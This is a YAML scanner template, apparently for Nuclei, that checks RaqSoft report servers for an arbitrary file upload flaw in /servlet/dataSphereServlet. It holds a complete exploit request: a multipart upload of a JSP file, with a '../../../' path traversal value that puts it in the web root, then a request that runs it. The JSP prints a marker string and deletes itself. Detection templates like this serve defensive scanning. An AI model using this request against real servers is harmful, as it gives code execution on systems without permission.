id: raqsoft-servlet-dataSphereServlet-fileupload
info:
  name: 润乾报表 /servlet/dataSphereServlet - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/ibaiw/2024Hvv/blob/dca4284a493278e19dfb4512a8afa0fd47b162ce/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8dataSphereServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips:
    repair:
    version:
  tags: 2024,fileupload,raqsoft

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /servlet/dataSphereServlet?action=38 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 395
        Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="openGrpxFile"; filename="{{filename}}.jsp"
        Content-Type: text/plain

        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="path"

        ../../../
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="saveServer"

        1
        --eac629ee4641cb0fe10596fba5e0c5d9--
        
      - |+
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_1,'openFileCallback')
          - contains(body_2,'{{randstr}}')
        condition: and